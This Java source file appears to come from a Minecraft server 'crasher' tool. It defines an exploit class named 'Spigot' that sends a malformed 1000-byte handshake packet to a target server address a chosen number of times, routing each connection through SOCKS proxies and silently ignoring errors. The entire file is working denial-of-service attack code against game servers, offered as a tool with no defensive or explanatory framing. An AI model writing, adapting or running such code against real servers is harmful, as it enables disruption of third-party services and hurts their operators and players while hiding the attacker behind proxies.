package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.ProxyHelper;
import uwu.narumi.crasher.api.optimizer.Optimizer;

@ExploitInfo(
    name = "Spigot",
    description = "Malformed handshake packet"
)
public class Spigot extends Exploit<byte[]> {

  public Spigot() {
    super(() -> {
          byte[] bytes = new byte[1000];
          for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) (i % 2 == 0 ? 1 : 0);
          }
          return bytes;
        },
        new Argument("address", 0, McAddress.class),
        new Argument("amount", 1, Integer.class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    index.set(0);

    McAddress address = (McAddress) args[0];
    int amount = (int) args[1];

    Optimizer.startOptimizing(Spigot.class);
    Optimizer.post(() -> {
      Proxy proxy = ProxyHelper.getSocks();
      try {
        Socket socket = ProxyHelper.createSocket(proxy);
        if (socket == null) {
          throw new ThreadDeath();
        }

        socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
        socket.getOutputStream().write(exploitSource().get().length);
        socket.getOutputStream().write(exploitSource().get());

        Optimizer.update();
        System.out.println(String
            .format("%s -> %s | %s/%s", proxy, address, index.getAndIncrement(),
                amount));
      } catch (Exception ignored) {
      }
    }, amount);
  }
}
